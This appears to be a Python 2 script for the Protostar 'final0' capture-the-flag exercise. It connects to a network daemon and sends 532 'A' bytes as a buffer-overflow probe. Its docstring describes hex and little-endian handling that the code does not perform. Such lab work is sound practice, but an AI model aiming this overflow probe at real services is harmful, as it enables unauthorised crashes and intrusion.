"""
This code is for protostar final0 challange.
Will connect to final0 network daemon, send a simple payload to from server, convert to hex, then send back in little endian.
"""
import socket
import sys
import re
import struct

try:
 #create an AF_INET, STREAM socket (TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error, msg:
    print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
    sys.exit()

print 'Socket Created'

host = sys.argv[1]
port = sys.argv[2]

try:
    remote_ip = socket.gethostbyname( host )

except socket.gaierror:
 #could not resolve
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

print 'Ip address of ' + host + ' is ' + remote_ip

#Connect to remote server
s.connect((remote_ip, int(port)))

print 'Socket Connected to ' + host + ' on ip ' + remote_ip
buffer_size = 532
try:
    payload = "A"
    s.sendall(payload*buffer_size+"\n")

    recv = s.recv(4096)
    print recv

except socket.error:
 #Send failed
    print 'Send failed'
    sys.exit()

print 'Done.'
